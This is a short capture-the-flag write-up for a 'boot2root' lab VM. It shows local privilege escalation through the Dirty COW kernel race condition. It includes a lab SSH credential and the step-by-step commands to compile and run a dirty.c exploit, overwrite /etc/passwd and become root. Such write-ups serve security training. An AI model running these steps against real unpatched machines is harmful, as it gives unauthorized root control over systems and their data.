# boot2root writeup1 (dirty cow)

Since we already covered the code execution part in the 1st writeup we are going to start this challenge with a user we can ssh, such as zaz: `zaz/646da671ca01bb5d84dbb5fb2238dc8e`

```
$ uname -r
3.2.0-91-generic-pae
```

`uname -r` reveal we are running under linux kernel 3.2 (< to 4.8 (or 4.7 i don't remember) which is the version it got patched) thus it's vulnerable to dirty cow, a vulnerability that exploit a race condition with mmap private mapping which allow us to mmap the original file instead of a copy (thus we can write over /etc/passwd)

```
$ scp scripts/dirty.c zaz@192.168.56.102:/tmp
$ ssh zaz@192.168.56.102
(remote) cd /tmp && gcc -pthread dirty.c -o dirty -lcrypt
(remote) ./dirty password (wait 10sec and ctrl+c)
(remote) su firefart (type password)
(remote) cp /etc/passwd.bak /etc/passwd
(remote) /* edit /etc/passwd to create a new user / modify root password */
(remote) exit
(remote) su root (type password)
(remote) whoami
root
```
